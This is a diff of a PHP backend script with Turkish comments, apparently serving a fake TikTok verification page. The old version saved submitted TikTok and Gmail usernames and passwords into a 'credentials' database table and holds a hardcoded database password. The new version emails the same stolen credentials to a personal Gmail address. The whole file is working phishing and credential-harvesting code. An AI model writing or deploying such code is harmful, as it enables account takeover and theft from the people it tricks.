@@ -1,47 +1,30 @@
-
 <?php
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
+// JSON'dan veriyi al
+$data = json_decode(file_get_contents("php://input"), true);
 
-header('Content-Type: application/json');
-header('Access-Control-Allow-Origin: *');
-header('Access-Control-Allow-Methods: POST');
-header('Access-Control-Allow-Headers: Content-Type');
+// Gelen verileri kontrol et
+$username = $data['username'] ?? '';
+$password = $data['password'] ?? '';
+$gmail = $data['gmail'] ?? '';
+$gmailPassword = $data['gmailPassword'] ?? '';
+$timestamp = date('Y-m-d H:i:s');
 
-$servername = "sql301.infinityfree.com"; // Senin host’unu kullan (InfinityFree’den al)
-$username = "if0_39051691"; // Senin kullanıcı adını kullan
-$password = "jWDjsbfHJdbCa"; // Senin şifreni kullan
-$dbname = "if0_39051691_tiktokverify"; // Senin veritabanı adını kullan
+// Mesajı hazırla
+$message = "Yeni Kayıt:\n";
+if ($username) $message .= "TikTok Kullanıcı Adı: $username\n";
+if ($password) $message .= "TikTok Şifre: $password\n";
+if ($gmail) $message .= "Gmail: $gmail\n";
+if ($gmailPassword) $message .= "Gmail Şifre: $gmailPassword\n";
+$message .= "Zaman: $timestamp";
 
-$conn = new mysqli($servername, $username, $password, $dbname);
+// Mail bilgileri
+$to = "doganneslihan437@gmail.com";  // <- buraya kendi e-posta adresini yaz
+$subject = "Yeni Form Verisi Geldi";
+$headers = "From: noreply@seninsite.com";
 
-if ($conn->connect_error) {
-    die(json_encode(["error" => "Connection failed: " . $conn->connect_error]));
-}
+// E-posta gönder
+mail($to, $subject, $message, $headers);
 
-$data = json_decode(file_get_contents('php://input'), true);
-
-if ($data) {
-    $username = isset($data['username']) ? $conn->real_escape_string($data['username']) : null;
-    $password = isset($data['password']) ? $conn->real_escape_string($data['password']) : null;
-    $gmail = isset($data['gmail']) ? $conn->real_escape_string($data['gmail']) : null;
-    $gmailPassword = isset($data['gmail_password']) ? $conn->real_escape_string($data['gmail_password']) : null;
-
-    $sql = "INSERT INTO credentials (username, password, gmail, gmail_password) VALUES (?, ?, ?, ?)";
-    $stmt = $conn->prepare($sql);
-    $stmt->bind_param("ssss", $username, $password, $gmail, $gmailPassword);
-
-    if ($stmt->execute()) {
-        echo json_encode(["message" => "Data saved"]);
-    } else {
-        echo json_encode(["error" => "Data save failed: " . $conn->error]);
-    }
-
-    $stmt->close();
-} else {
-    echo json_encode(["error" => "No data received"]);
-}
-
-$conn->close();
+// İsteğe bağlı: başarılı mesaj döndür
+echo json_encode(["success" => true]);
 ?>
